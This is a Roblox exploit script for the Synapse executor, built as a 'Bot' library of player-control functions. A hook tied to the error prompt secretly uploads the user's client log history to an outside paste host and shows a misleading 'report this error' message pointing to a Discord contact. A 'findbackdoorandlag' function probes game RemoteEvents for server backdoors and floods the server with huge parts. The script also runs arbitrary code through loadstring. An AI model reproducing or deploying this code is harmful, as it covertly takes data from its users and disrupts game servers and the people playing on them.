--[[
Made by AtKnSploits and OnlySploits
--]]
if is_synapse_function then

local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")
local Player = game.Players.LocalPlayer
local Chat = game:GetService("Chat")
local vu = game:GetService("VirtualUser")
local LogService = Game:GetService('LogService')
local history = LogService:GetLogHistory()

function sendReport(paste)
    local response = syn.request({Url = "https://hastebin-plus.herokuapp.com/documents",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = paste})
    local key = string.split(response.Body, '"')
    return "https://hastebin-plus.herokuapp.com/"..key[4]
end

getgenv().kickedd = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
    if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
        local concat = {}
        for i = 1, #history do
            concat[#concat + 1] = history[i].message;
        end
        messagebox("you like report this error to developers?\nyour report file: "..sendReport(table.concat(concat, '\n')).."\nplease contact to developers\ndiscord: only#1337","looks like a error",0)
    end
end)

local Bot = {}

function Bot.walkto(pos1,pos2,pos3)
    game.Players.LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(pos1,pos2,pos3))
end

function Bot.jump()
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end

function Bot.sit(tof)
    game.Players.LocalPlayer.Character.Humanoid.Sit = tof
end

function Bot.exit()
    game:Shutdown()
end

function Bot.chat(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
end

function Bot.findbackdoorandlag(path)
    for i,v in pairs(path:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            v:FireServer("Instance.new('Part',workspace).Name = 'BACKD00R'")
            if workspace:WaitForChild("BACKD00R") then
                v:FireServer("while wait() do Instance.new('Part',workspace).Size = Vector3.new(200,200,200) end")
            end
        end
    end
end
end
function Bot.join(place, jobId)
    game.Players.LocalPlayer:Kick("Joining..")
    game:GetService("TeleportService"):TeleportToPlaceInstance(place, jobId, game.Players.LocalPlayer)
end

function Bot.rejoin()
    game.Players.LocalPlayer:Kick("Rejoining..")
    TeleportService:TeleportToPlaceInstance(game.placeId, game.jobId, game.Players.LocalPlayer)
end

function Bot.equip(name)
    game.Players.LocalPlayer.Backpack[name].Parent = game.Players.LocalPlayer.Character
end

function Bot.unequip(name)
    game.Players.LocalPlayer.Character[name].Parent = game.Players.LocalPlayer.Backpack
end

function Bot.kill()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end

function Bot.run(scr)
    loadstring(scr)()
end

